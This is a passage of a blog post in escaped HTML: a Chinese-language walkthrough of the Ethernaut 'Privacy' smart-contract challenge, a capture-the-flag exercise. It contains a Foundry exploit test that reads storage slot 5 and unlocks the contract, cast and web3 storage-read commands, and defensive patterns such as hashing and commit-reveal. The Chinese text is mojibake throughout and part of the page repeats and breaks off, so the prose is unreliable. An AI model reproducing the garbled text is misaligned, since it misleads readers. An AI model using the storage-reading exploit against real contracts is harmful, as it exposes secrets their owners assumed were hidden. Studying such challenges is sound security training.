title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"ç›®æ ‡å‡½æ•°åˆ†æ\"><a href=\"#ç›®æ ‡å‡½æ•°åˆ†æ\" class=\"headerlink\" title=\"ç›®æ ‡å‡½æ•°åˆ†æ\"></a>ç›®æ ‡å‡½æ•°åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">    require(_key == bytes16(data[2]));  // éœ€è¦ data[2] çš„ bytes16 ç‰ˆæœ¬</span><br><span class=\"line\">    locked = false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„çš„æ¡ä»¶æ˜¯ <code>_key</code> å¿…é¡»ç­‰äº <code>bytes16(data[2])</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®¿é—® <code>data[2]</code> å‘¢ï¼Ÿ</p>\n<h3 id=\"å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\"><a href=\"#å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\"></a>å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ</h3><p>åˆçº¦çš„çŠ¶æ€å˜é‡ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool public locked = true;</span><br><span class=\"line\">uint256 public ID = block.timestamp;</span><br><span class=\"line\">uint8 private flattening = 10;</span><br><span class=\"line\">uint8 private denomination = 255;</span><br><span class=\"line\">uint16 private awkwardness = uint16(block.timestamp);</span><br><span class=\"line\">bytes32[3] private data;</span><br></pre></td></tr></table></figure>\n\n<p>ç”±äºæ²¡æœ‰ç»§æ‰¿ï¼Œå­˜å‚¨ä» slot 0 å¼€å§‹ï¼Œå¸¦æœ‰ <code>locked</code> å˜é‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>Slot</th>\n<th>Variable</th>\n<th>Type</th>\n<th>Size</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td><code>locked</code></td>\n<td><code>bool</code></td>\n<td>1 byte</td>\n<td><code>locked</code> å ç”¨1ä¸ªå­—èŠ‚ï¼Œä½†ç”±äºä¸‹ä¸€ä¸ªå€¼ä¸é€‚åˆå‰©ä¸‹çš„31ä¸ªå­—èŠ‚ï¼Œ<code>locked</code> å ç”¨äº†æ•´ä¸ªæ’æ§½</td>\n</tr>\n<tr>\n<td>1</td>\n<td><code>ID</code></td>\n<td><code>uint256</code></td>\n<td>32 bytes</td>\n<td><code>uint256</code> å ç”¨32å­—èŠ‚ï¼Œæ‰€ä»¥æ˜¯1ä¸ªæ»¡æ§½</td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>flattening</code><br/><code>denomination</code><br/><code>awkwardness</code></td>\n<td><code>uint8</code><br/><code>uint8</code><br/><code>uint16</code></td>\n<td>1+1+2 bytes</td>\n<td>åˆ†åˆ«æ˜¯1ä¸ªå­—èŠ‚+1ä¸ªå­—èŠ‚+2ä¸ªå­—èŠ‚ï¼ŒSolidityå°†å®ƒä»¬æ‰“åŒ…åˆ°ä¸€ä¸ªæ’æ§½ä¸­</td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>data[0]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td>é™æ€æ•°ç»„å¯åŠ¨ä¸€ä¸ªæ–°çš„å­˜å‚¨æ§½ï¼Œæ¯ä¸ª <code>bytes32</code> å…ƒç´ å ç”¨ä¸€ä¸ªå®Œæ•´çš„æ§½</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>data[1]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>data[2]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td><strong>è¿™ä¸ªæ§½ä½å°±æ˜¯ <code>data[2]</code></strong></td>\n</tr>\n</tbody></table>\n<p>é€šè¿‡è¿™ä¸ªè¯¦ç»†çš„å­˜å‚¨å¸ƒå±€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>data[2]</code> å­˜å‚¨åœ¨ slot 5 ä¸­ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/PrivacyFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PrivacyTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    PrivacyFactory privacyFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        privacyFactory = new PrivacyFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(privacyFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPrivacyExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        Privacy instance = Privacy(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»ï¼šè¯»å– slot 5 ä¸­çš„ data[2]</span><br><span class=\"line\">        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è½¬æ¢ä¸º bytes16 å¹¶è§£é”</span><br><span class=\"line\">        bytes16 key = bytes16(data2);</span><br><span class=\"line\">        instance.unlock(key);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤å…³å¡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // é¢å¤–æµ‹è¯•ï¼šéªŒè¯å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">    function testStorageLayout() public &#123;</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æŸ¥å„ä¸ª slot çš„å†…å®¹</span><br><span class=\"line\">        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked</span><br><span class=\"line\">        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID</span><br><span class=\"line\">        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables</span><br><span class=\"line\">        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]</span><br><span class=\"line\">        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]</span><br><span class=\"line\">        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Slot 0 (locked):&quot;, uint256(slot0));</span><br><span class=\"line\">        console.log(&quot;Slot 1 (ID):&quot;, uint256(slot1));</span><br><span class=\"line\">        console.log(&quot;Slot 2 (packed):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot2);</span><br><span class=\"line\">        console.log(&quot;Slot 3 (data[0]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot3);</span><br><span class=\"line\">        console.log(&quot;Slot 4 (data[1]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot4);</span><br><span class=\"line\">        console.log(&quot;Slot 5 (data[2]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot5);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ†æå­˜å‚¨å¸ƒå±€</strong>ï¼šç¡®å®š <code>data[2]</code> å­˜å‚¨åœ¨ slot 5</li>\n<li><strong>è¯»å–å­˜å‚¨</strong>ï¼šä½¿ç”¨ <code>vm.load()</code> è¯»å– slot 5 çš„æ•°æ®</li>\n<li><strong>æ•°æ®è½¬æ¢</strong>ï¼šå°† <code>bytes32</code> è½¬æ¢ä¸º <code>bytes16</code></li>\n<li><strong>è°ƒç”¨ unlock</strong>ï¼šä½¿ç”¨è½¬æ¢åçš„ key è§£é”åˆçº¦</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// è¯»å– slot 5 ä¸­çš„ data[2]</span><br><span class=\"line\">bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\"></span><br><span class=\"line\">// è½¬æ¢ä¸º bytes16</span><br><span class=\"line\">bytes16 key = bytes16(data2);  // å–å‰16ä¸ªå­—èŠ‚</span><br><span class=\"line\"></span><br><span class=\"line\">// è§£é”åˆçº¦</span><br><span class=\"line\">instance.unlock(key);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"><a href=\"#1-ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\" class=\"headerlink\" title=\"1. ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"></a>1. ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šç§æœ‰æ•°æ®å­˜å‚¨åœ¨é“¾ä¸Š</span><br><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    bytes32[3] private secretData;  // ä»ç„¶å¯ä»¥è¢«è¯»å–ï¼</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">        require(_key == bytes16(secretData[2]));</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯</span><br><span class=\"line\">contract SecureContract &#123;</span><br><span class=\"line\">    bytes32 private dataHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _data) &#123;</span><br><span class=\"line\">        dataHash = keccak256(abi.encodePacked(_data));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes32 _data) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_data)) == dataHash);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\"><a href=\"#2-ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\" class=\"headerlink\" title=\"2. ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\"></a>2. ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitReveal &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    mapping(address =&gt; bool) private revealed;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ</span><br><span class=\"line\">    function commit(bytes32 _hashedData) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _hashedData;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯</span><br><span class=\"line\">    function reveal(bytes32 _data, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        revealed[msg.sender] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\"><a href=\"#å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\" class=\"headerlink\" title=\"å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\"></a>å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€</span></span><br><span class=\"line\">forge inspect &lt;ContractName&gt; storage-layout</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ cast è¯»å–å­˜å‚¨</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ web3.py è¯»å–å­˜å‚¨</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">data = w3.eth.get_storage_at(contract_address, 5)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ•°æ®ç±»å‹è½¬æ¢\"><a href=\"#æ•°æ®ç±»å‹è½¬æ¢\" class=\"headerlink\" title=\"æ•°æ®ç±»å‹è½¬æ¢\"></a>æ•°æ®ç±»å‹è½¬æ¢</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bytes32 åˆ° bytes16 è½¬æ¢</span><br><span class=\"line\">bytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;</span><br><span class=\"line\">bytes16 halfData = bytes16(fullData);  // å–å‰16ä¸ªå­—èŠ‚</span><br><span class=\"line\"></span><br><span class=\"line\">// æ•°æ®æ‰“åŒ…è§£æ</span><br><span class=\"line\">bytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;</span><br><span class=\"line\">uint8 flattening = uint8(packedData);           // æœ€å1å­—èŠ‚</span><br><span class=\"line\">uint8 denomination = uint8(packedData &gt;&gt; 8);    // å€’æ•°2å­—èŠ‚  </span><br><span class=\"line\">uint16 awkwardness = uint16(packedData &gt;&gt; 16);  // å€’æ•°3-4å­—èŠ‚</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åŒæ ·ï¼Œé“¾ä¸Šæ˜¯æ²¡æœ‰éšç§ã€‚ä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»</li>\n<li>åˆç†å®‰æ’ä½ çš„å­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥èŠ‚çœ gas</li>\n<li>EVM ä½¿ç”¨ 32 å­—èŠ‚çš„å­˜å‚¨æ§½ï¼Œå°äº 32 å­—èŠ‚çš„ç±»å‹ä¼šè¢«æ‰“åŒ…</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡å­˜å‚¨å¸ƒå±€åˆ†ææ‰¾åˆ°ç›®æ ‡æ•°æ®çš„ slot ä½ç½®</li>\n<li>ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®</li>\n<li>æ­£ç¡®å¤„ç†æ•°æ®ç±»å‹è½¬æ¢å’Œæ•°æ®æ‰“åŒ…</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®</li>\n<li>ä½¿ç”¨å“ˆå¸Œã€æ‰¿è¯ºæ–¹æ¡ˆæˆ–é“¾ä¸‹éªŒè¯</li>\n<li>è€ƒè™‘ä½¿ç”¨åŠ å¯†å­˜å‚¨è§£å†³æ–¹æ¡ˆ</li>\n<li>åˆç†è®¾è®¡å­˜å‚¨å¸ƒå±€ä»¥æé«˜æ•ˆç‡</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://solidity-by-example.org/hacks/accessing-private-data/\">Private data</a></li>\n<li><a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/\">EVM storage</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html\">Storage layout</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-12-Privacy-å­˜å‚¨å¸ƒå±€åˆ†æ\"><a href=\"#ğŸ¯-Ethernaut-Level-12-Privacy-å­˜å‚¨å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ\"></a>ğŸ¯ Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/12\">Ethernaut Level 12 - Privacy</a><br><strong>æ”»å‡»ç±»å‹</strong>: å­˜å‚¨å¸ƒå±€åˆ†æ<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¦è¯»å– <code>private</code> æ•°æ®ï¼Œç„¶åè°ƒç”¨ <code>unlock</code> å‡½æ•°ã€‚è¿™ä¸ªå…³å¡è¿›ä¸€æ­¥è€ƒéªŒå¯¹ EVM å­˜å‚¨å¸ƒå±€çš„ç†è§£ï¼Œç‰¹åˆ«æ˜¯é™æ€æ•°ç»„å’Œæ•°æ®æ‰“åŒ…çš„å¤„ç†ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg\" alt=\"Privacy Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"ç›®æ ‡å‡½æ•°åˆ†æ\"><a href=\"#ç›®æ ‡å‡½æ•°åˆ†æ\" class=\"headerlink\" title=\"ç›®æ ‡å‡½æ•°åˆ†æ\"></a>ç›®æ ‡å‡½æ•°åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">    require(_key == bytes16(data[2]));  // éœ€è¦ data[2] çš„ bytes16 ç‰ˆæœ¬</span><br><span class=\"line\">    locked = false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„çš„æ¡ä»¶æ˜¯ <code>_key</code> å¿…é¡»ç­‰äº <code>bytes16(data[2])</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®¿é—® <code>data[2]</code> å‘¢ï¼Ÿ</p>\n<h3 id=\"å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\"><a href=\"#å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\"></a>å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ</h3><p>åˆçº¦çš„çŠ¶æ€å˜é‡ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool public locked = true;</span><br><span class=\"line\">uint256 public ID = block.timestamp;</span><br><span class=\"line\">uint8 private flattening = 10;</span><br><span class=\"line\">uint8 private denomination = 255;</span><br><span class=\"line\">uint16 private awkwardness = uint16(block.timestamp);</span><br><span class=\"line\">bytes32[3] private data;</span><br></pre></td></tr></table></figure>\n\n<p>ç”±äºæ²¡æœ‰ç»§æ‰¿ï¼Œå­˜å‚¨ä» slot 0 å¼€å§‹ï¼Œå¸¦æœ‰ <code>locked</code> å˜é‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>Slot</th>\n<th>Variable</th>\n<th>Type</th>\n<th>Size</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td><code>locked</code></td>\n<td><code>bool</code></td>\n<td>1 byte</td>\n<td><code>locked</code> å ç”¨1ä¸ªå­—èŠ‚ï¼Œä½†ç”±äºä¸‹ä¸€ä¸ªå€¼ä¸é€‚åˆå‰©ä¸‹çš„31ä¸ªå­—èŠ‚ï¼Œ<code>locked</code> å ç”¨äº†æ•´ä¸ªæ’æ§½</td>\n</tr>\n<tr>\n<td>1</td>\n<td><code>ID</code></td>\n<td><code>uint256</code></td>\n<td>32 bytes</td>\n<td><code>uint256</code> å ç”¨32å­—èŠ‚ï¼Œæ‰€ä»¥æ˜¯1ä¸ªæ»¡æ§½</td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>flattening</code><br/><code>denomination</code><br/><code>awkwardness</code></td>\n<td><code>uint8</code><br/><code>uint8</code><br/><code>uint16</code></td>\n<td>1+1+2 